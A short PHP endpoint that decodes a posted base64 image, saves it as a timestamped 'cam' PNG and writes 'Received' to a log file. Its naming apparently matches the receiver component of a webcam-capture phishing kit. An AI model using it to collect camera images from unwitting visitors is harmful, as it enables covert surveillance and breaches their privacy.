<?php
header('Content-Type: application/json');

// Validate input exists and is non-empty
if (empty($_POST['cat'])) {
    echo json_encode(['status' => 'error', 'message' => 'No image data']);
    exit();
}

$imageData = $_POST['cat'];

// Validate it looks like a data URL (must contain a comma)
$commaPos = strpos($imageData, ',');
if ($commaPos === false) {
    echo json_encode(['status' => 'error', 'message' => 'Invalid image data']);
    exit();
}

// Decode the base64 portion after the comma
$filteredData  = substr($imageData, $commaPos + 1);
$unencodedData = base64_decode($filteredData, true); // strict mode

if ($unencodedData === false) {
    echo json_encode(['status' => 'error', 'message' => 'Base64 decode failed']);
    exit();
}

// Build a safe filename using timestamp
$date     = date('dMYHis');
$filename = 'cam' . $date . '.png';

// Attempt to save the image
$fp = fopen($filename, 'wb');
if ($fp === false) {
    echo json_encode(['status' => 'error', 'message' => 'Cannot write image file']);
    exit();
}

fwrite($fp, $unencodedData);
fclose($fp);

// Only write the detection log AFTER the image is saved successfully
error_log("Received\r\n", 3, "Log.log");

echo json_encode(['status' => 'success']);
exit();
?>
